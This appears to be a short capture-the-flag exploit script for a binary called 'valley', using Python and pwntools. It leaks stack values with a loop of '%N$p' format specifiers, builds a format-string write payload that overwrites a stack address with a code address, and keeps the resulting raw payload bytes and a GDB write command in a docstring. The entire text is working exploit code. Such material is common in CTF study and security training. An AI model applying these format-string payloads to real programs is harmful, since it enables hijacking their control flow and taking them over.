for i in range(30, 40):
    print(f"%{i}$p ", end="")
print()

from pwn import *
context.binary=ELF("./valley")

payload = fmtstr_payload(6, {0x7fffffffd588: 0x555555555269}, write_size="short")
print(payload)

"""
%21097c%10\$lln%748c%11\$hn%12\$hna\x88\xd5\xff\xff\xff\x7f\x00\x00\x8a\xd5\xff\xff\xff\x7f\x00\x00\x8c\xd5\xff\xff\xff\x7f\x00\x00
set {long} 0x7fffffffd568 = 0x0000555555555269
"""